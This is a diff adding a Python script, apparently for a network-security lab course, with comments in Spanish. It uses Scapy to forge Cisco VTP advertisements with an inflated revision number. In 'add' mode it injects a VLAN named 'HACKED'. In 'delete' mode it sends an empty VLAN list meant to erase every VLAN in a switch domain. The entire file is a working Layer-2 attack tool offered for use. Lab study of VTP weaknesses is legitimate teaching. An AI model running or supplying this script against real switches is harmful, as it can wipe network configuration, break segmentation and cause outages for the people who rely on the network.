@@ -1,0 +1,141 @@
+vtp attack
+
+
+
+import argparse
+import struct
+import sys
+from scapy.all import (
+    Ether, LLC, SNAP, sendp, Raw, conf
+)
+
+# ==================================================
+# Constantes VTP
+# ==================================================
+VTP_MULTICAST   = "01:00:0c:cc:cc:cc"
+SNAP_OUI        = 0x00000c
+SNAP_TYPE_VTP   = b'\x20\x03'
+LLC_DSAP        = 0xaa
+LLC_SSAP        = 0xaa
+LLC_CTRL        = 0x03
+
+
+def build_vtp_summary(domain: str, revision: int) -> bytes:
+    """Construye un VTP Summary Advertisement (tipo 1)."""
+    domain_bytes = domain.encode().ljust(32, b'\x00')[:32]
+    payload = bytes([
+        0x01,           # Version VTP 1
+        0x01,           # Tipo: Summary Advertisement
+        0x00,           # Followers
+        len(domain),    # Longitud del dominio
+    ])
+    payload += domain_bytes
+    payload += struct.pack('>I', revision)   # Número de revisión
+    payload += b'\x00' * 12                  # Timestamp (simplificado)
+    payload += b'\x00' * 16                  # MD5 digest (omitido en lab)
+    return payload
+
+
+def build_vtp_subset(domain: str, revision: int,
+                     vlan_id: int, vlan_name: str,
+                     delete: bool = False) -> bytes:
+    """Construye un VTP Subset Advertisement (tipo 2).
+
+    delete=True envía lista vacía de VLANs (borra todas).
+    """
+    domain_bytes = domain.encode().ljust(32, b'\x00')[:32]
+    header = bytes([
+        0x01,           # Versión VTP 1
+        0x02,           # Tipo: Subset Advertisement
+        0x01,           # Número de secuencia
+        len(domain),
+    ])
+    header += domain_bytes
+    header += struct.pack('>I', revision)
+
+    if delete:
+        # Lista vacía = elimina todas las VLANs del dominio
+        return header
+
+    # Información de VLAN
+    vname = vlan_name.encode().ljust(16, b'\x00')[:16]
+    vlan_entry = bytes([
+        0x00,           # Status (activa)
+        0x00,           # Tipo (Ethernet)
+    ])
+    vlan_entry += struct.pack('>H', vlan_id)    # VLAN ID
+    vlan_entry += struct.pack('>H', vlan_id * 2)  # Número ISL
+    vlan_entry += vname
+    return header + vlan_entry
+
+
+def send_vtp(iface: str, payload: bytes, label: str) -> None:
+    """Encapsula el payload en LLC/SNAP y lo envía."""
+    pkt = (
+        Ether(dst=VTP_MULTICAST) /
+        LLC(dsap=LLC_DSAP, ssap=LLC_SSAP, ctrl=LLC_CTRL) /
+        SNAP(OUI=SNAP_OUI, code=int.from_bytes(SNAP_TYPE_VTP, 'big')) /
+        Raw(load=payload)
+    )
+    print(f"[*] Enviando {label} en {iface}...")
+    sendp(pkt, iface=iface, verbose=False)
+    print(f"[+] {label} enviado correctamente.")
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="VTP Attack Tool - Lab Seguridad en Redes"
+    )
+    parser.add_argument('-i', '--iface',     required=True,
+                        help='Interfaz de red (ej. eth0)')
+    parser.add_argument('-m', '--mode',      required=True,
+                        choices=['add', 'delete'],
+                        help='Modo: add=agregar VLAN | delete=borrar todas')
+    parser.add_argument('--vlan-id',         type=int, default=666,
+                        help='ID de VLAN a agregar (default: 666)')
+    parser.add_argument('--vlan-name',       default='HACKED',
+                        help='Nombre de la VLAN (default: HACKED)')
+    parser.add_argument('--domain',          default='LAB',
+                        help='Dominio VTP (default: LAB)')
+    parser.add_argument('--rev',             type=int, default=9999,
+                        help='Número de revisión (default: 9999)')
+    args = parser.parse_args()
+
+    print("=" * 55)
+    print("  VTP ATTACK TOOL - Lab Seguridad en Redes")
+    print(f"  Interfaz : {args.iface}")
+    print(f"  Modo     : {args.mode.upper()}")
+    print(f"  Dominio  : {args.domain}")
+    print(f"  Revisión : {args.rev}")
+    print("=" * 55)
+
+    if args.mode == 'add':
+        if not (1 <= args.vlan_id <= 4094):
+            print("[!] VLAN ID debe estar entre 1 y 4094.")
+            sys.exit(1)
+        print(f"[*] Objetivo: Agregar VLAN {args.vlan_id} ({args.vlan_name})")
+        summary = build_vtp_summary(args.domain, args.rev)
+        send_vtp(args.iface, summary, "VTP Summary Advertisement")
+        subset = build_vtp_subset(args.domain, args.rev,
+                                  args.vlan_id, args.vlan_name)
+        send_vtp(args.iface, subset, f"VTP Subset (VLAN {args.vlan_id})")
+        print(f"\n[✓] VLAN {args.vlan_id} '{args.vlan_name}' inyectada.")
+
+    elif args.mode == 'delete':
+        print("[!] ADVERTENCIA: Se enviarán paquetes para borrar todas las VLANs.")
+        confirm = input("    ¿Confirmar? (yes/no): ")
+        if confirm.lower() != 'yes':
+            print("[x] Operación cancelada.")
+            sys.exit(0)
+        summary = build_vtp_summary(args.domain, args.rev)
+        send_vtp(args.iface, summary, "VTP Summary Advertisement")
+        subset = build_vtp_subset(args.domain, args.rev,
+                                  0, '', delete=True)
+        send_vtp(args.iface, subset, "VTP Subset (DELETE ALL VLANs)")
+        print("\n[✓] Comando de borrado de VLANs enviado.")
+
+    print("\n[i] Revisa el switch objetivo para verificar el efecto.")
+
+
+if __name__ == "__main__":
+    main()
